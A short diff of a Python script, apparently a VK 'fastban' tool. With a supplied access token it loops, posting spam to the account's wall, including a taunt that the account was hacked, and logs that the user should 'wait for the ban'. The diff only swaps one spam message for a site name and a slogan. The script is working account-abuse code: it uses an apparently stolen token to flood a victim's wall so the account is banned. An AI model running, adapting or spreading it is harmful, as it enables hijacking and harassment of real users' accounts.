@@ -38,7 +38,7 @@ def fastban():
         token = vk_api.VkApi(token = tok) 
         vk = token.get_api()
         for var in range(10):
-            vk.wall.post(message='Бан1')
+            vk.wall.post(message='vkbot.ru')
             vk.wall.post(message='Твоя жопа взломана! Привет от Дани!')
             print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
         fastban()
@@ -48,7 +48,7 @@ def fastban():
         vk = token.get_api()
         for var in range(10):
             time.sleep(1)
-            vk.wall.post(message='Бан2')
+            vk.wall.post(message='Сова никогда не спит')
             vk.wall.post(message='Твоя жопа взломана! Привет от Дани!')
             print(Fore.BLACK + Back.GREEN + "[log] Сообщение отправленно. Ожидайте бана!")
         fastban()
